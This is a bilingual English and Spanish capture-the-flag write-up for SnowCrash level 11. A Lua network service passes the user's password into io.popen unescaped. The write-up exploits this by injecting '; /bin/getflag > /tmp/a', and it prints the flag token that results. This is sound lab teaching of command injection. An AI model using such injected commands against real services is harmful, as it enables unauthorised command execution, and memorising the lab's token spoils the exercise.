### LEVEL11 (BONUS)

- We have a Lua script and a token.
    ```bash
    level10@SnowCrash:~$ ls -la
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
    ```

- `cat level11.lua` We have a script that seems to open a connection on `127.0.0.1:5151`.

- We check if it's running.
    ```bash
    level11@SnowCrash:~$ nc -vz 127.0.0.1 5151
    Connection to 127.0.0.1 5151 port [tcp/pcrd] succeeded!
    ```

- We see that it's running.

- We connect.
    ```bash
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: 1234
    rf nope..
    ```

- We investigate the script.

- We see that the script accepts a connection, requests a password, then passes it through the hash function that returns a SHA1 hash.
    ```lua
    1	#!/usr/bin/env lua
    2	local socket = require("socket")
    3	local server = assert(socket.bind("127.0.0.1", 5151))
    [...]
    17	  local client = server:accept()
    18	  client:send("Password: ")
    19	  client:settimeout(60)
    20	  local l, err = client:receive()
    21	  if not err then
    22	      print("trying " .. l)
    23	      local h = hash(l)
    [...]
     5	function hash(pass)
     6	  prog = io.popen("echo "..pass.." | sha1sum", "r")
     7	  data = prog:read("*all")
     8	  prog:close()
     9	
    10	  data = string.sub(data, 1, 40)
    11	
    12	  return data
    13	end
    [...]

- Then it checks with an if statement if the hash returned by the function matches a hash.

- But the if or the else statement only display some strings, it's a rabbit hole.
    ```lua
    [...]
    25	      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
    26	          client:send("Erf nope..\n");
    27	      else
    28	          client:send("Gz you dumb*\n")
    29	      end
    [...]
    ```

- The attack vector lies within the hash(pass) function.
    ```lua
    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("*all")
      prog:close()

      data = string.sub(data, 1, 40)

      return data
    end
    ```

- `io.popen` executes a system command.
    ```lua
    [...]
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    [...]
    ```

- In this case, it would execute an `echo "..pass.." | sha1sum`, where `..pass..` is the string we pass when prompted for the password.

- It's possible to execute arbitrary commands through injection.

- We need it to execute `/bin/getflag > /tmp/a`.

- If we insert `; /bin/getflag > /tmp/a` when prompted for the password, the hash function would become:
    ```lua
    io.popen("echo " ; /bin/getflag > /tmp/a " | sha1sum", "r")
    ```

- Luego podriamos ver el resultado en /tmp/a

- Vamos a ello:
    ```bash
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: ; /bin/getflag > /tmp/a
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/a
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
    ```

---

### LEVEL11 (BONUS)

- Tenemos un script en lua y un token
    ```bash
    level10@SnowCrash:~$ ls -la
    -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10  flag10     26 Mar  5  2016 token
    ```

- `cat level11.lua` tenemos un script que parece abrir una conexion en `127.0.0.1:5151`.

- comprobamos si está en en ejecucion
    ```bash
    level11@SnowCrash:~$ nc -vz 127.0.0.1 5151
    Connection to 127.0.0.1 5151 port [tcp/pcrd] succeeded!
    ```

- Vemos que está en funcionamiento

- Nos conectamos:
    ```bash
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: 1234
    rf nope..
    ```

- Investigamos el script

- Vemos que el script acepta una conexion, solicita una password, la pasa por la funcion hash que retorna un sh1 
    ```lua
    1	#!/usr/bin/env lua
    2	local socket = require("socket")
    3	local server = assert(socket.bind("127.0.0.1", 5151))
    [...]
    17	  local client = server:accept()
    18	  client:send("Password: ")
    19	  client:settimeout(60)
    20	  local l, err = client:receive()
    21	  if not err then
    22	      print("trying " .. l)
    23	      local h = hash(l)
    [...]
     5	function hash(pass)
     6	  prog = io.popen("echo "..pass.." | sha1sum", "r")
     7	  data = prog:read("*all")
     8	  prog:close()
     9	
    10	  data = string.sub(data, 1, 40)
    11	
    12	  return data
    13	end
    [...]
    ```

- Luego comprueba con un if si el hash que retorna la funcion coincide con un hash

- Pero el if o el else solo muestra unas cadenas, es un rabbit hole
    ```lua
    [...]
    25	      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
    26	          client:send("Erf nope..\n");
    27	      else
    28	          client:send("Gz you dumb*\n")
    29	      end
    [...]
    ```

- El vector de atacque está en la funcion hash(pass)
    ```lua
    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r")
      data = prog:read("*all")
      prog:close()

      data = string.sub(data, 1, 40)

      return data
    end
    ```

- `io.popen` ejecuta un comando del sistema
    ```lua
    [...]
    prog = io.popen("echo "..pass.." | sha1sum", "r")
    [...]
    ```

- En este caso se ejecutaría un `echo "..pass.." | sha1sum` siendo `..pass..` la string que le pasamos cuando nos solicita la clave

- Es posible poder ejecutar un comando arbitrario por medio de in inyección

- necesitamos que ejecute `/bin/getflag > /tmp/a`

- Si cando nos pide la password insertamos `; /bin/getflag > /tmp/a` en la funcion hash nos quedaria:
    ```lua
    io.popen("echo " ; /bin/getflag > /tmp/a " | sha1sum", "r")
    ```

- Luego podriamos ver el resultado en /tmp/a

- Vamos a ello:
    ```bash
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: ; /bin/getflag > /tmp/a
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/a
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
    ```

